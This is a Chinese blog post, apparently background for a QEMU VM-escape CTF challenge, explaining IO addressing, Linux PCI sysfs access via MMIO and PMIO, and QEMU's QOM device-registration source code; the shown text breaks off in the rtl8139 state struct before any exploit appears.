---
layout: post
title:  "VM escape - PCI 签到题"
date:   2021-3-18
desc: ""
keywords: ""
categories: [Binary]
tags: [qemu]
icon: icon-html
---

# VM escape - PCI 签到题

> 我逃不掉

## IO 编址

CPU 需要和 IO 设备（Input/Output Device）进行交互，交互需要通过总线上的物理地址识别 IO 端口，地址由硬件决定，端口地址空间是否占用内存地址空间由编址方法决定，有两种编址方法：

统一编址：在 CPU 地址空间中划出一部分作为 IO 端口范围，把端口当作内存单元 ，可以使用内存访问指令进行交互。

独立编址：IO 端口地址空间与内存地址空间独立，需要有专用 IO 指令和控制信号。

ARM、PowerPC 等没有，只支持统一编址。x86 有专用 IO 指令（IN、OUT），有控制信号引脚，支持独立编址，也支持统一编址。

### 例

![1](../../../../../../images/qemu-pci/1.jpg)

图中电路分配的端口号为：

```assembly
CS8255 EQU 0100H
A_8255 EQU 0100H
B_8255 EQU 0102H
C_8255 EQU 0104H
CTRL_8255 EQU 0106H

CS8253 EQU 0200H
X0_8253 EQU 0200H
X1_8253 EQU 0202H
X2_8253 EQU 0204H
CRTL_8253 EQU 0206H

CS8259 EQU 0300H
ICW1 EQU 0300H
ICW2 EQU 0302H
ICW3 EQU 0302H
ICW4 EQU 0302H
OCW1 EQU 0302H
OCW2 EQU 0300H
```

8086 有专用 IO 指令：

```assembly
IN AL, PORT ;AL<==PORT
OUT PORT AL ;PORT<==AL
```

有控制信号引脚：

（8086）M//IO：存储器或 IO 端口访问信号，三态输出。M//IO=1，表示 CPU 正在访问存储器；M//IO=0，表示 CPU 正在访问 IO 端口。

片选信号由地址总线在 74273 锁存后经 74154 译码后得到。

74154 真值表如下（G1、G2 对应图中 E1、E2）：

![2](../../../../../../images/qemu-pci/2.png)

地址锁存后，当 A8 为高电平，其余均为低电平时（地址：0b100000000），若 M//IO=0 即 CPU 正在访问 IO 端口，74154 输入端状态如下：

```
A:1
B:0
C:0
D:0
E1:0
E2:0
```

此时 74154 输出端 1 口输出低电平，在设计电路时 74154 1 口被设置为 8255 的片选信号。

若 M//IO=1 即 CPU 正在访问储存器，74154 输入端状态如下：

```
A:1
B:0
C:0
D:0
E1:1
E2:0
```

输出均为高电平，8255 没有选通。

若忽略 M//IO，E1 接地而不接 M//IO，此时只要地址为 0b100000000，1 口都会输出低电平，选通 8255：

```
A:1
B:0
C:0
D:0
E1:0
E2:0
```

使用内存访问指令和专用 IO 指令均可与 8255 进行交互，8255 与相同地址的内存冲突，也就是占用了内存地址空间。



## PCI 设备

PCI（Peripheral Component Interconnect）设备：符合外设部件互连标准的设备。

linux 中一切皆文件，在 `/sys/devices/pci0000:00` 可以看到 PCI 设备。

```
root@ubuntu:/sys/devices/pci0000:00# ls
0000:00:00.0  0000:00:15.0  0000:00:16.1  0000:00:17.2  0000:00:18.3
0000:00:01.0  0000:00:15.1  0000:00:16.2  0000:00:17.3  0000:00:18.4
0000:00:07.0  0000:00:15.2  0000:00:16.3  0000:00:17.4  0000:00:18.5
0000:00:07.1  0000:00:15.3  0000:00:16.4  0000:00:17.5  0000:00:18.6
0000:00:07.3  0000:00:15.4  0000:00:16.5  0000:00:17.6  0000:00:18.7
0000:00:07.7  0000:00:15.5  0000:00:16.6  0000:00:17.7  firmware_node
0000:00:0f.0  0000:00:15.6  0000:00:16.7  0000:00:18.0  pci_bus
0000:00:10.0  0000:00:15.7  0000:00:17.0  0000:00:18.1  power
0000:00:11.0  0000:00:16.0  0000:00:17.1  0000:00:18.2  uevent
```

### linux-5.11.5\Documentation\PCI\sysfs-pci.rst（翻译）

sysfs 通常挂载在 /sys 上，在支持的平台上提供对 PCI 资源的访问。例如，给定的总线可能像这样：

```
     /sys/devices/pci0000:17
     |-- 0000:17:00.0
     |   |-- class
     |   |-- config
     |   |-- device
     |   |-- enable
     |   |-- irq
     |   |-- local_cpus
     |   |-- remove
     |   |-- resource
     |   |-- resource0
     |   |-- resource1
     |   |-- resource2
     |   |-- revision
     |   |-- rom
     |   |-- subsystem_device
     |   |-- subsystem_vendor
     |   `-- vendor
     `-- ...

```

最上面的元素描述了 PCI 域和总线号。在本例中，域号为 0000 总线号为 17（所有值都是十六进制）。这个总线在插槽 0 中包含一个功能设备。为了方便，复制了域号和总线号。在设备目录下有若干个文件，每个文件都有自己的功能。

```
       =================== =====================================================
       file		   function
       =================== =====================================================
       class		   PCI class (ascii, ro)
       config		   PCI config space (binary, rw)
       device		   PCI device (ascii, ro)
       enable	           Whether the device is enabled (ascii, rw)
       irq		   IRQ number (ascii, ro)
       local_cpus	   nearby CPU mask (cpumask, ro)
       remove		   remove device from kernel's list (ascii, wo)
       resource		   PCI resource host addresses (ascii, ro)
       resource0..N	   PCI resource N, if present (binary, mmap, rw\ [1]_)
       resource0_wc..N_wc  PCI WC map resource N, if prefetchable (binary, mmap)
       revision		   PCI revision (ascii, ro)
       rom		   PCI ROM resource, if present (binary, ro)
       subsystem_device	   PCI subsystem device (ascii, ro)
       subsystem_vendor	   PCI subsystem vendor (ascii, ro)
       vendor		   PCI vendor (ascii, ro)
       =================== =====================================================
::
  ro - read only file
  rw - file is readable and writable
  wo - write only file
  mmap - file is mmapable
  ascii - file contains ascii text
  binary - file contains binary data
  cpumask - file contains a cpumask type
.. [1] rw for IORESOURCE_IO (I/O port) regions only

```

只读文件是 informational 的，向它们写入数据将会被忽略，rom 文件除外。可写文件可用于在设备上执行操作（例如改变配置空间，解除设备）。mmapable 文件可以通过这个文件 offset 为 0 的映射（mmap）访问，可用于从用户空间对真实设备编程。注意一些平台不支持某些 resources 的映射，因此在任何 mmap 尝试后都应该检查返回值。其中最应该注意的是 IO 端口 resources，它也支持读写。

enable 文件提供了一个计数器，表示已启用设备的次数。如果 enable 文件当前返回 4，并且一个 1 echo 给它（`echo 1 > enable`），它将返回 5。echo 0 将减少计数。即使减少到 0，有些初始化也可能无法逆转。

rom 文件的特殊之处在于，它提供对设备 ROM 文件的只读访问权限（如果有）。但是默认情况下是禁用的。因此应用程序应在尝试调用 read 之前写一个字符串 "1" 到文件中去启用它，并在访问之后写一个 ”0“ 去禁用它。注意读取 ROM必须启用设备才能成功返回数据。如果驱动没有绑定到设备，可以使用上面的 enable 文件启用它。

remove 文件通过写入非 0 整数删除 PCI 设备。这不涉及任何类型的热插拔功能，例如关闭设备电源。设备将从内核的 PCI 设备列表中删除，该设备的 sysfs 目录也将删除，并将该设备从任何连接的驱动中删除。禁止移除 PCI 根总线。



通过 sysfs 访问远古资源（legacy resources）

如果平台支持，sysfs 也提供了远古 IO 端口和 ISA 内存资源，它们在 PCI 类层级中，例如：

```
	/sys/class/pci_bus/0000:17/
	|-- bridge -> ../../../devices/pci0000:17
	|-- cpuaffinity
	|-- legacy_io
	`-- legacy_mem
```

legacy_io 文件是一个可读写文件，应用程序可以用它执行远古端口 IO。应用应该打开文件，寻找所需端口（例如 0x3e8），并进行 1、2、4 字节的读写操作。legacy_mem 应使用对应所需内存偏移量的 offset 来 mmap，例如 VGA 帧缓冲区使用 0xa0000。染红应用程序可以简单的解引用返回的指针（当然是在检查错误之后）访问远古内存空间。



在新平台上支持 PCI 访问

为了支持如上所述的 PCI 资源映射，Linux 平台代码最好应该定义 ARCH_GENERIC_PCI_MMAP_RESOURCE 并使用该功能的通用实现。为了通过 `/proc/bus/pci` 中的文件支持 mmap() 的历史接口，平台还可以设置 HAVE_PCI_MMAP。

或者，设置 HAVE_PCI_MMAP 的平台可以提供它们自己的 pci_mmap_page_range() 实现，而不是定义 ARCH_GENERIC_PCI_MMAP_RESOURCE。

支持 PCI 资源合并写映射的平台必须定义 arch_can_pci_mmap_wc()，当允许合并写时，结果应该是非 0。支持 IO 资源映射的平台类似的定义 arch_can_pci_mmap_io() 。

远古资源受 HAVE_PCI_LEGACY 定义保护。希望支持远古功能的平台应该对其进行定义，并提供 provide pci_legacy_read、pci_legacy_write、pci_mmap_legacy_page_range 函数。



###  resources

```c
linux-5.11.5\include\linux\ioport.h
/*
 * Resources are tree-like, allowing
 * nesting etc..
 */
struct resource {
	resource_size_t start;
	resource_size_t end;
	const char *name;
	unsigned long flags;
	unsigned long desc;
	struct resource *parent, *sibling, *child;
};

/*
 * IO resources have these defined flags.
 *
 * PCI devices expose these flags to userspace in the "resource" sysfs file,
 * so don't move them.
 */
#define IORESOURCE_BITS		0x000000ff	/* Bus-specific bits */

#define IORESOURCE_TYPE_BITS	0x00001f00	/* Resource type */
#define IORESOURCE_IO		0x00000100	/* PCI/ISA I/O ports */
#define IORESOURCE_MEM		0x00000200
#define IORESOURCE_REG		0x00000300	/* Register offsets */
#define IORESOURCE_IRQ		0x00000400
#define IORESOURCE_DMA		0x00000800
#define IORESOURCE_BUS		0x00001000

#define IORESOURCE_PREFETCH	0x00002000	/* No side effects */
#define IORESOURCE_READONLY	0x00004000
#define IORESOURCE_CACHEABLE	0x00008000
#define IORESOURCE_RANGELENGTH	0x00010000
#define IORESOURCE_SHADOWABLE	0x00020000

#define IORESOURCE_SIZEALIGN	0x00040000	/* size indicates alignment */
#define IORESOURCE_STARTALIGN	0x00080000	/* start field is alignment */

#define IORESOURCE_MEM_64	0x00100000
#define IORESOURCE_WINDOW	0x00200000	/* forwarded by bridge */
#define IORESOURCE_MUXED	0x00400000	/* Resource is software muxed */

#define IORESOURCE_EXT_TYPE_BITS 0x01000000	/* Resource extended types */
#define IORESOURCE_SYSRAM	0x01000000	/* System RAM (modifier) */

/* IORESOURCE_SYSRAM specific bits. */
#define IORESOURCE_SYSRAM_DRIVER_MANAGED	0x02000000 /* Always detected via a driver. */
#define IORESOURCE_SYSRAM_MERGEABLE		0x04000000 /* Resource can be merged. */

#define IORESOURCE_EXCLUSIVE	0x08000000	/* Userland may not map this resource */

#define IORESOURCE_DISABLED	0x10000000
#define IORESOURCE_UNSET	0x20000000	/* No address assigned yet */
#define IORESOURCE_AUTO		0x40000000
#define IORESOURCE_BUSY		0x80000000	/* Driver has marked this resource busy */

/* I/O resource extended types */
#define IORESOURCE_SYSTEM_RAM		(IORESOURCE_MEM|IORESOURCE_SYSRAM)

/* PnP IRQ specific bits (IORESOURCE_BITS) */
#define IORESOURCE_IRQ_HIGHEDGE		(1<<0)
#define IORESOURCE_IRQ_LOWEDGE		(1<<1)
#define IORESOURCE_IRQ_HIGHLEVEL	(1<<2)
#define IORESOURCE_IRQ_LOWLEVEL		(1<<3)
#define IORESOURCE_IRQ_SHAREABLE	(1<<4)
#define IORESOURCE_IRQ_OPTIONAL 	(1<<5)

/* PnP DMA specific bits (IORESOURCE_BITS) */
#define IORESOURCE_DMA_TYPE_MASK	(3<<0)
#define IORESOURCE_DMA_8BIT		(0<<0)
#define IORESOURCE_DMA_8AND16BIT	(1<<0)
#define IORESOURCE_DMA_16BIT		(2<<0)

#define IORESOURCE_DMA_MASTER		(1<<2)
#define IORESOURCE_DMA_BYTE		(1<<3)
#define IORESOURCE_DMA_WORD		(1<<4)

#define IORESOURCE_DMA_SPEED_MASK	(3<<6)
#define IORESOURCE_DMA_COMPATIBLE	(0<<6)
#define IORESOURCE_DMA_TYPEA		(1<<6)
#define IORESOURCE_DMA_TYPEB		(2<<6)
#define IORESOURCE_DMA_TYPEF		(3<<6)

/* PnP memory I/O specific bits (IORESOURCE_BITS) */
#define IORESOURCE_MEM_WRITEABLE	(1<<0)	/* dup: IORESOURCE_READONLY */
#define IORESOURCE_MEM_CACHEABLE	(1<<1)	/* dup: IORESOURCE_CACHEABLE */
#define IORESOURCE_MEM_RANGELENGTH	(1<<2)	/* dup: IORESOURCE_RANGELENGTH */
#define IORESOURCE_MEM_TYPE_MASK	(3<<3)
#define IORESOURCE_MEM_8BIT		(0<<3)
#define IORESOURCE_MEM_16BIT		(1<<3)
#define IORESOURCE_MEM_8AND16BIT	(2<<3)
#define IORESOURCE_MEM_32BIT		(3<<3)
#define IORESOURCE_MEM_SHADOWABLE	(1<<5)	/* dup: IORESOURCE_SHADOWABLE */
#define IORESOURCE_MEM_EXPANSIONROM	(1<<6)

/* PnP I/O specific bits (IORESOURCE_BITS) */
#define IORESOURCE_IO_16BIT_ADDR	(1<<0)
#define IORESOURCE_IO_FIXED		(1<<1)
#define IORESOURCE_IO_SPARSE		(1<<2)

/* PCI ROM control bits (IORESOURCE_BITS) */
#define IORESOURCE_ROM_ENABLE		(1<<0)	/* ROM is enabled, same as PCI_ROM_ADDRESS_ENABLE */
#define IORESOURCE_ROM_SHADOW		(1<<1)	/* Use RAM image, not ROM BAR */

/* PCI control bits.  Shares IORESOURCE_BITS with above PCI ROM.  */
#define IORESOURCE_PCI_FIXED		(1<<4)	/* Do not move resource */
#define IORESOURCE_PCI_EA_BEI		(1<<5)	/* BAR Equivalent Indicator */

```

resource 文件是一个只读的 ascii 文件，内容如下：

```
0x0000000000000000 0x0000000000000000 0x0000000000000000
```



## PMIO、MMIO

IO 编址取决于 CPU，CPU 可能只支持统一编址，也可能同时支持统一编址、独立编址。操作系统可能在不同 CPU 上运行，所以在设计操作系统时应该考虑这些情况。

访问 IO 端口有两种方式：MMIO（Memery-Mapped IO，内存映射 IO）、PMIO（Port-Mapped IO，端口映射 IO）。Linux Kernel 实现了这两种方式。

MMIO：把 IO 端口映射到内存空间（mmapable 文件），通过访问 IO 内存访问 IO 端口。

```c
int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
if (mmio_fd == -1)
	puts("mmio_fd open failed");
void* mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
if (mmio_mem == MAP_FAILED)
    puts("mmap mmio_mem failed");
```

也可以直接访问物理内存 `/dev/mem`

```c
int mmio_fd = open("/dev/mem", O_RDWR|O_SYNC);
if (mmio_fd == -1)
	puts("mmio_fd open failed");
void* mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
if (mmio_mem == MAP_FAILED)
    puts("mmap mmio_mem failed");
```

PMIO：不映射，直接用 `out*()`、`in*()`等函数访问 IO 端口。

```c
outl(val,PMIO_BASE + offset);
inl(PMIO_BASE + offset)
```



## QEMU-设备仿真

QEMU 提供一套面向对象的模型 QMO（QEMU Object Model），通过 QOM 可以对 QEMU 中的资源进行抽象，几乎所有的设备都是由 QOM 实现。

### type 注册

设备要调用 `type_init()`  注册自己：

```c
include\qemu\module.h
#define type_init(function) module_init(function, MODULE_INIT_QOM)
```

```c
include\qemu\module.h
/* This should not be used directly.  Use block_init etc. instead.  */
#define module_init(function, type)                                         \
static void __attribute__((constructor)) do_qemu_init_ ## function(void)    \
{                                                                           \
    register_module_init(function, type);                                   \
}
```

constructor 先于 main 执行

这里使用了 `##` 拼接， 展开后应为 do_qemu_init_xx()

```c
static void __attribute__((constructor)) do_qemu_init_fuck()    \
{                                                                           \
    register_module_init(fuck, type);                                   \
}
```

type 定义如下：

```c
include\qemu\module.h
typedef enum {
    MODULE_INIT_MIGRATION,
    MODULE_INIT_BLOCK,
    MODULE_INIT_OPTS,
    MODULE_INIT_QOM,
    MODULE_INIT_TRACE,
    MODULE_INIT_XEN_BACKEND,
    MODULE_INIT_LIBQOS,
    MODULE_INIT_FUZZ_TARGET,
    MODULE_INIT_MAX
} module_init_type;
```

`type_init()` 即 type 为 `MODULE_INIT_QOM` 的 `register_module_init()`

```c
include\qemu\module.c
static void init_lists(void)
{
    static int inited;
    int i;

    if (inited) {
        return;
    }

    for (i = 0; i < MODULE_INIT_MAX; i++) {
        QTAILQ_INIT(&init_type_list[i]);
    }

    QTAILQ_INIT(&dso_init_list);

    inited = 1;
}


static ModuleTypeList *find_type(module_init_type type)
{
    init_lists();

    return &init_type_list[type];
}

void register_module_init(void (*fn)(void), module_init_type type)
{
    ModuleEntry *e;
    ModuleTypeList *l;

    e = g_malloc0(sizeof(*e));
    e->init = fn;
    e->type = type;

    l = find_type(type);

    QTAILQ_INSERT_TAIL(l, e, node);
}

include\qemu\queue.h
#define QTAILQ_INSERT_TAIL(head, elm, field) do {                       \
        (elm)->field.tqe_next = NULL;                                   \
        (elm)->field.tqe_circ.tql_prev = (head)->tqh_circ.tql_prev;     \
        (head)->tqh_circ.tql_prev->tql_next = (elm);                    \
        (head)->tqh_circ.tql_prev = &(elm)->field.tqe_circ;             \
} while (/*CONSTCOND*/0)
    


```

`register_module_init()` 以 type 作为参数执行 `find_type()`，在 `find_type()` 中先执行 `init_lists()` 初始化（如果已经初始化就直接返回），然后返回 `&init_type_list[type]`。`init_type_list` 储存所有 type 的 list，`find_type()` 返回对应 type 的 list，然后将新注册的 module 插入到该 list 的尾部。

对于 QOM，应插入的 list 是 `init_type_list[MODULE_INIT_QOM]`。

```c
util\module.c
typedef struct ModuleEntry
{
    void (*init)(void);
    QTAILQ_ENTRY(ModuleEntry) node;
    module_init_type type;
} ModuleEntry;

typedef QTAILQ_HEAD(, ModuleEntry) ModuleTypeList;

static ModuleTypeList init_type_list[MODULE_INIT_MAX];
```

list 的结构很清晰，每个节点都是一个 ModuleEntry，有 init 函数、指向下一节点的指针、type 三个成员。

module_call_init() 函数初始化 module：

```c
util\module.c
void module_call_init(module_init_type type)
{
    ModuleTypeList *l;
    ModuleEntry *e;

    if (modules_init_done[type]) {
        return;
    }

    l = find_type(type);

    QTAILQ_FOREACH(e, l, node) {
        e->init();
    }

    modules_init_done[type] = true;
}
```

根据 type 找到 list，然后遍历执行 init 函数。

对于 QOM，初始化应调用 `module_call_init(MODULE_INIT_QOM);`。init 函数一般为 type_register_static()

```c
qom\object.c
static TypeImpl *type_register_internal(const TypeInfo *info)
{
    TypeImpl *ti;
    ti = type_new(info);

    type_table_add(ti);
    return ti;
}

TypeImpl *type_register(const TypeInfo *info)
{
    assert(info->parent);
    return type_register_internal(info);
}

TypeImpl *type_register_static(const TypeInfo *info)
{
    return type_register(info);
}
```

其中 TypeInfo 和 TypeImpl 定义如下：

```c
include\qom\object.h
typedef struct TypeInfo TypeInfo;
include\qom\object.c
/**
 * struct TypeInfo:
 * @name: The name of the type.
 * @parent: The name of the parent type.
 * @instance_size: The size of the object (derivative of #Object).  If
 *   @instance_size is 0, then the size of the object will be the size of the
 *   parent object.
 * @instance_align: The required alignment of the object.  If @instance_align
 *   is 0, then normal malloc alignment is sufficient; if non-zero, then we
 *   must use qemu_memalign for allocation.
 * @instance_init: This function is called to initialize an object.  The parent
 *   class will have already been initialized so the type is only responsible
 *   for initializing its own members.
 * @instance_post_init: This function is called to finish initialization of
 *   an object, after all @instance_init functions were called.
 * @instance_finalize: This function is called during object destruction.  This
 *   is called before the parent @instance_finalize function has been called.
 *   An object should only free the members that are unique to its type in this
 *   function.
 * @abstract: If this field is true, then the class is considered abstract and
 *   cannot be directly instantiated.
 * @class_size: The size of the class object (derivative of #ObjectClass)
 *   for this object.  If @class_size is 0, then the size of the class will be
 *   assumed to be the size of the parent class.  This allows a type to avoid
 *   implementing an explicit class type if they are not adding additional
 *   virtual functions.
 * @class_init: This function is called after all parent class initialization
 *   has occurred to allow a class to set its default virtual method pointers.
 *   This is also the function to use to override virtual methods from a parent
 *   class.
 * @class_base_init: This function is called for all base classes after all
 *   parent class initialization has occurred, but before the class itself
 *   is initialized.  This is the function to use to undo the effects of
 *   memcpy from the parent class to the descendants.
 * @class_data: Data to pass to the @class_init,
 *   @class_base_init. This can be useful when building dynamic
 *   classes.
 * @interfaces: The list of interfaces associated with this type.  This
 *   should point to a static array that's terminated with a zero filled
 *   element.
 */
struct TypeInfo
{
    const char *name;
    const char *parent;

    size_t instance_size;
    size_t instance_align;
    void (*instance_init)(Object *obj);
    void (*instance_post_init)(Object *obj);
    void (*instance_finalize)(Object *obj);

    bool abstract;
    size_t class_size;

    void (*class_init)(ObjectClass *klass, void *data);
    void (*class_base_init)(ObjectClass *klass, void *data);
    void *class_data;

    InterfaceInfo *interfaces;
};

typedef struct TypeImpl TypeImpl;

struct TypeImpl
{
    const char *name;

    size_t class_size;

    size_t instance_size;
    size_t instance_align;

    void (*class_init)(ObjectClass *klass, void *data);
    void (*class_base_init)(ObjectClass *klass, void *data);

    void *class_data;

    void (*instance_init)(Object *obj);
    void (*instance_post_init)(Object *obj);
    void (*instance_finalize)(Object *obj);

    bool abstract;

    const char *parent;
    TypeImpl *parent_type;

    ObjectClass *class;

    int num_interfaces;
    InterfaceImpl interfaces[MAX_INTERFACES];
};


```

`type_register_internal()` ，type_new() 根据 info 构造 TypeImpl：

```c
static TypeImpl *type_new(const TypeInfo *info)
{
    TypeImpl *ti = g_malloc0(sizeof(*ti));
    int i;

    g_assert(info->name != NULL);

    if (type_table_lookup(info->name) != NULL) {
        fprintf(stderr, "Registering `%s' which already exists\n", info->name);
        abort();
    }

    ti->name = g_strdup(info->name);
    ti->parent = g_strdup(info->parent);

    ti->class_size = info->class_size;
    ti->instance_size = info->instance_size;
    ti->instance_align = info->instance_align;

    ti->class_init = info->class_init;
    ti->class_base_init = info->class_base_init;
    ti->class_data = info->class_data;

    ti->instance_init = info->instance_init;
    ti->instance_post_init = info->instance_post_init;
    ti->instance_finalize = info->instance_finalize;

    ti->abstract = info->abstract;

    for (i = 0; info->interfaces && info->interfaces[i].type; i++) {
        ti->interfaces[i].typename = g_strdup(info->interfaces[i].type);
    }
    ti->num_interfaces = i;

    return ti;
}
```

然后 `type_table_add()` 插入到哈希表中，key 为 ti->name，value 为 ti：

```c
static void type_table_add(TypeImpl *ti)
{
    assert(!enumerating_types);
    g_hash_table_insert(type_table_get(), (void *)ti->name, ti);
}
```

至此，type 注册完毕。



### class 初始化

`object_class_foreach()` 初始化 class：

```c
qom\object.c
void object_class_foreach(void (*fn)(ObjectClass *klass, void *opaque),
                          const char *implements_type, bool include_abstract,
                          void *opaque)
{
    OCFData data = { fn, implements_type, include_abstract, opaque };

    enumerating_types = true;
    g_hash_table_foreach(type_table_get(), object_class_foreach_tramp, &data);
    enumerating_types = false;
}
```

其中 `type_table_get()` 返回 type 注册时的哈希表。

```c
static void object_class_foreach_tramp(gpointer key, gpointer value,
                                       gpointer opaque)
{
    OCFData *data = opaque;
    TypeImpl *type = value;
    ObjectClass *k;

    type_initialize(type);
    k = type->class;

    if (!data->include_abstract && type->abstract) {
        return;
    }

    if (data->implements_type && 
        !object_class_dynamic_cast(k, data->implements_type)) {
        return;
    }

    data->fn(k, data->opaque);
}
```

type_initialize() 以 type 为参数初始化，type 是 TypeImpl 类型。

```c
static void type_initialize(TypeImpl *ti)
{
    TypeImpl *parent;

    if (ti->class) {
        return;
    }

    ti->class_size = type_class_get_size(ti);
    ti->instance_size = type_object_get_size(ti);
    /* Any type with zero instance_size is implicitly abstract.
     * This means interface types are all abstract.
     */
    if (ti->instance_size == 0) {
        ti->abstract = true;
    }
    if (type_is_ancestor(ti, type_interface)) {
        assert(ti->instance_size == 0);
        assert(ti->abstract);
        assert(!ti->instance_init);
        assert(!ti->instance_post_init);
        assert(!ti->instance_finalize);
        assert(!ti->num_interfaces);
    }
    ti->class = g_malloc0(ti->class_size);

    parent = type_get_parent(ti);
    if (parent) {
        type_initialize(parent);
        GSList *e;
        int i;

        g_assert(parent->class_size <= ti->class_size);
        g_assert(parent->instance_size <= ti->instance_size);
        memcpy(ti->class, parent->class, parent->class_size);
        ti->class->interfaces = NULL;

        for (e = parent->class->interfaces; e; e = e->next) {
            InterfaceClass *iface = e->data;
            ObjectClass *klass = OBJECT_CLASS(iface);

            type_initialize_interface(ti, iface->interface_type, klass->type);
        }

        for (i = 0; i < ti->num_interfaces; i++) {
            TypeImpl *t = type_get_by_name(ti->interfaces[i].typename);
            if (!t) {
                error_report("missing interface '%s' for object '%s'",
                             ti->interfaces[i].typename, parent->name);
                abort();
            }
            for (e = ti->class->interfaces; e; e = e->next) {
                TypeImpl *target_type = OBJECT_CLASS(e->data)->type;

                if (type_is_ancestor(target_type, t)) {
                    break;
                }
            }

            if (e) {
                continue;
            }

            type_initialize_interface(ti, t, t);
        }
    }

    ti->class->properties = g_hash_table_new_full(g_str_hash, g_str_equal, NULL,
                                                  object_property_free);

    ti->class->type = ti;

    while (parent) {
        if (parent->class_base_init) {
            parent->class_base_init(ti->class, ti->class_data);
        }
        parent = type_get_parent(parent);
    }

    if (ti->class_init) {
        ti->class_init(ti->class, ti->class_data);
    }
}
```

如果 class 已经初始化（`ti->class`）直接返回。

如果有 parent，递归调用 type_initialize()。

最后调用 `ti->class_init`。

至此，class 初始化完毕。



### 设备初始化

device_init_func() ==> qdev_device_add() ==> qdev_new() ==> object_new() ==> object_new_with_type() ==> object_initialize_with_type()

```c
//softmmu\vl.c
static int device_init_func(void *opaque, QemuOpts *opts, Error **errp)
{
    DeviceState *dev;

    dev = qdev_device_add(opts, errp);
    if (!dev && *errp) {
        error_report_err(*errp);
        return -1;
    } else if (dev) {
        object_unref(OBJECT(dev));
    }
    return 0;
}
```

```c
softmmu\qdev-monitor.c
DeviceState *qdev_device_add(QemuOpts *opts, Error **errp)
{
    DeviceClass *dc;
    const char *driver, *path;
    DeviceState *dev = NULL;
    BusState *bus = NULL;
    bool hide;

    driver = qemu_opt_get(opts, "driver");
    if (!driver) {
        error_setg(errp, QERR_MISSING_PARAMETER, "driver");
        return NULL;
    }

    /* find driver */
    dc = qdev_get_device_class(&driver, errp);
    if (!dc) {
        return NULL;
    }

    /* find bus */
    path = qemu_opt_get(opts, "bus");
    if (path != NULL) {
        bus = qbus_find(path, errp);
        if (!bus) {
            return NULL;
        }
        if (!object_dynamic_cast(OBJECT(bus), dc->bus_type)) {
            error_setg(errp, "Device '%s' can't go on %s bus",
                       driver, object_get_typename(OBJECT(bus)));
            return NULL;
        }
    } else if (dc->bus_type != NULL) {
        bus = qbus_find_recursive(sysbus_get_default(), NULL, dc->bus_type);
        if (!bus || qbus_is_full(bus)) {
            error_setg(errp, "No '%s' bus found for device '%s'",
                       dc->bus_type, driver);
            return NULL;
        }
    }
    hide = should_hide_device(opts);

    if ((hide || qdev_hotplug) && bus && !qbus_is_hotpluggable(bus)) {
        error_setg(errp, QERR_BUS_NO_HOTPLUG, bus->name);
        return NULL;
    }

    if (hide) {
        return NULL;
    }

    if (!migration_is_idle()) {
        error_setg(errp, "device_add not allowed while migrating");
        return NULL;
    }

    /* create device */
    dev = qdev_new(driver);

    /* Check whether the hotplug is allowed by the machine */
    if (qdev_hotplug && !qdev_hotplug_allowed(dev, errp)) {
        goto err_del_dev;
    }

    if (!bus && qdev_hotplug && !qdev_get_machine_hotplug_handler(dev)) {
        /* No bus, no machine hotplug handler --> device is not hotpluggable */
        error_setg(errp, "Device '%s' can not be hotplugged on this machine",
                   driver);
        goto err_del_dev;
    }

    qdev_set_id(dev, qemu_opts_id(opts));

    /* set properties */
    if (qemu_opt_foreach(opts, set_property, dev, errp)) {
        goto err_del_dev;
    }

    dev->opts = opts;
    if (!qdev_realize(DEVICE(dev), bus, errp)) {
        dev->opts = NULL;
        goto err_del_dev;
    }
    return dev;

err_del_dev:
    if (dev) {
        object_unparent(OBJECT(dev));
        object_unref(OBJECT(dev));
    }
    return NULL;
}

```

```c
softmmu\qdev-monitor.c
DeviceState *qdev_new(const char *name)
{
    if (!object_class_by_name(name)) {
        module_load_qom_one(name);
    }
    return DEVICE(object_new(name));
}
```

```c
qom\object.c
Object *object_new(const char *typename)
{
    TypeImpl *ti = type_get_by_name(typename);

    return object_new_with_type(ti);
}
```

根据 typename 在哈希表中找到 value，然后调用 `object_new_with_type()`

```c
qom\object.c
static Object *object_new_with_type(Type type)
{
    Object *obj;
    size_t size, align;
    void (*obj_free)(void *);

    g_assert(type != NULL);
    type_initialize(type);

    size = type->instance_size;
    align = type->instance_align;

    /*
     * Do not use qemu_memalign unless required.  Depending on the
     * implementation, extra alignment implies extra overhead.
     */
    if (likely(align <= __alignof__(qemu_max_align_t))) {
        obj = g_malloc(size);
        obj_free = g_free;
    } else {
        obj = qemu_memalign(align, size);
        obj_free = qemu_vfree;
    }

    object_initialize_with_type(obj, size, type);
    obj->free = obj_free;

    return obj;
}
```

object_initialize_with_type()

```c
qom\object.c
static void object_initialize_with_type(Object *obj, size_t size, TypeImpl *type)
{
    type_initialize(type);

    g_assert(type->instance_size >= sizeof(Object));
    g_assert(type->abstract == false);
    g_assert(size >= type->instance_size);

    memset(obj, 0, type->instance_size);
    obj->class = type->class;
    object_ref(obj);
    object_class_property_init_all(obj);
    obj->properties = g_hash_table_new_full(g_str_hash, g_str_equal,
                                            NULL, object_property_free);
    object_init_with_type(obj, type);
    object_post_init_with_type(obj, type);
}

static void object_init_with_type(Object *obj, TypeImpl *ti)
{
    if (type_has_parent(ti)) {
        object_init_with_type(obj, type_get_parent(ti));
    }

    if (ti->instance_init) {
        ti->instance_init(obj);
    }
}
```

`ti->instance_init(obj)`，`qdev_new()` 结束。

继续 `qdev_device_add()`

qdev_device_add() ==> qdev_realize() ==> object_property_set_bool() ==> object_property_set_qobject() ==> object_property_set() ==> prop->set() ==> device_set_realized() ==> dc->realize()

执行 realize()，构造完毕。



### 例：rtl8139

```c
struct RTL8139State {
    /*< private >*/
    PCIDevice parent_obj;
    /*< public >*/

    uint8_t phys[8]; /* mac address */
    uint8_t mult[8]; /* multicast mask array */

    uint32_t TxStatus[4]; /* TxStatus0 in C mode*/ /* also DTCCR[0] and DTCCR[1] in C+ mode */
    uint32_t TxAddr[4];   /* TxAddr0 */
    uint32_t RxBuf;       /* Receive buffer */
    uint32_t RxBufferSize;/* internal variable, receive ring buffer size in C mode */
    uint32_t RxBufPtr;
    uint32_t RxBufAddr;

    uint16_t IntrStatus;
    uint16_t IntrMask;

    uint32_t TxConfig;
    uint32_t RxConfig;
    uint32_t RxMissed;

    uint16_t CSCR;

    uint8_t  Cfg9346;
    uint8_t  Config0;
    uint8_t  Config1;
    uint8_t  Config3;
    uint8_t  Config4;
